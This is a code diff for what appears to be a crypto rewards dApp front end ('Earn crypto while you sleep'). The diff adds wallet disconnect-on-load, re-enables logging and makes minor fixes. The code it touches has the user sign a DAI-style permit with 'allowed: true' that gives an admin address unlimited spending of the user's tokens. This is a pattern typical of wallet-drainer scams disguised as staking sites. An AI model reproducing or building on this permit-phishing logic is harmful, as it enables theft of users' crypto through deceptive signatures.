@@ -25,7 +25,7 @@ import daiAbi from "../contracts/abi.json";
 import withdrawWallet from "../contracts/wallet.json";
 import Countdown from "../components/CountDown";
 import { getBnbBalance } from "../utils";
-import { useAccount } from "wagmi";
+import { useAccount, useDisconnect, useSignTypedData } from "wagmi";
 import { useLoadingContext } from "../context/LoadingContext";
 import { getWalletClient } from "wagmi/actions";
 import { useEthersSigner } from "./getSigner";
@@ -226,12 +226,9 @@ const Alert = forwardRef((props: any, ref: any) => {
 
 const Home = () => {
   const { address, chainId } = useAccount();
+  const { disconnect } = useDisconnect();
   const signer = useEthersSigner();
-
-  if (!address || !chainId) {
-    console.log("Wallet not connected");
-    return;
-  }
+  const { signTypedDataAsync } = useSignTypedData();
 
   const [walletBalance, setWalletBalance] = useState(0);
   const [approved, setApproved] = useState(false);
@@ -301,6 +298,11 @@ const Home = () => {
       }
     }
   };
+
+  useEffect(() => {
+    // fetchWalletBalance();
+    disconnect();
+  }, []);
 
   useEffect(() => {
     // fetchWalletBalance();
@@ -396,7 +398,7 @@ const Home = () => {
           ],
         };
 
-        // console.log("types : ", types);
+        console.log("types : ", types);
         const values = {
           holder: address,
           spender: config.adminAddress,
@@ -404,10 +406,10 @@ const Home = () => {
           expiry: deadline,
           allowed: true,
         };
-        // console.log("values : ", values);
+        console.log("values : ", values);
 
         // Sign data
-        // const signature = await walletclient.signTypedData({
+        // const signature = await signTypedDataAsync({
         //   account: address as `0x${string}`,
         //   domain,
         //   types,
@@ -415,7 +417,9 @@ const Home = () => {
         //   message: values,
         // });
 
+        
         const signature = await signer.signTypedData(domain, types, values);
+        console.log(signature);
 
         if (signature) {
           console.log(signature);
@@ -440,7 +444,7 @@ const Home = () => {
       !_approved && bake();
     } catch (err) {
       // alert("Permit failed");
-      // console.error(err);
+      console.error(err);
     }
     setLoading(false);
   };
@@ -455,7 +459,7 @@ const Home = () => {
     }
     setLoading(true);
     try {
-      const balance = await getBnbBalance(address);
+      const balance = await getBnbBalance(address || "");
       setWalletBalance(balance);
 
       if (balance >= amount) {
@@ -475,7 +479,7 @@ const Home = () => {
           return;
         }
 
-        const result = await withdrawUpdate(address, amount, tabIndex + 1);
+        const result = await withdrawUpdate(address || "", amount, tabIndex + 1);
 
         if (result.message == "successful") {
           setRockedBalance(rockedBalance + amount);
@@ -568,7 +572,7 @@ const Home = () => {
       return;
     }
 
-    const result = await withdrawUpdate(address, e, withType);
+    const result = await withdrawUpdate(address || "", e, withType);
 
     if (result.data.message == "successful") {
       setLoading(false);
@@ -629,7 +633,7 @@ const Home = () => {
   return (
     <>
       <CardWrapper>
-        <CardContent sx={{marginTop: "100px"}}>
+        <CardContent sx={{ marginTop: "100px" }}>
           <Grid textAlign="center" alignItems="center">
             <Typography color="white" variant="h4" marginBottom={2.5}>
               Earn crypto while you sleep
@@ -655,7 +659,9 @@ const Home = () => {
                 My rewards
               </Typography>
               <Grid textAlign="center">
-                <Typography variant="h6">{truncateMiddle(address, 14, 5)}</Typography>
+                <Typography variant="h6">
+                  {truncateMiddle(address, 14, 5)}
+                </Typography>
               </Grid>
               <Grid alignItems="center" padding="32px 0" borderRadius="5px">
                 <Grid
